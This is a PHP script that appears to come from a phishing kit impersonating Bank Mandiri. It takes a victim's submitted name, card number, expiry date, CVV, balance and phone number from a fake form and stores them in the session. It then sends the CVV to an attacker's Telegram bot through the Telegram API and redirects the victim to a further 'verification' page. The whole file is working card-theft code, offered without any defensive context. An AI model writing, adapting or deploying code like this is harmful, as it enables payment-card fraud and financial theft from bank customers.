<?php
include "../telegram.php";
session_start();

$nama = $_POST['nama'];
$nokart = $_POST['nokart'];
$masa = $_POST['m'].'/'.$_POST['y'];
$cvv = $_POST['cvv'];
$saldo = $_POST['saldo'];
$nohp = $_POST['nohp'];

$_SESSION['nama'] = $nama;
$_SESSION['nokart'] = $nokart;
$_SESSION['cvv'] = $cvv;
$_SESSION['masa'] = $masa;
$_SESSION['saldo'] = $saldo;
$_SESSION['nohp'] = $nohp;

$message = "
( Mandiri | DATA )

- CVV : ".$cvv."
 ";
function sendMessage($id_telegram, $message, $id_botTele) {
    $url = "https://api.telegram.org/bot" . $id_botTele . "/sendMessage?parse_mode=markdown&chat_id=" . $id_telegram;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true);
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
sendMessage($id_telegram, $message, $id_botTele);
header('Location: ../ver.php');
?>
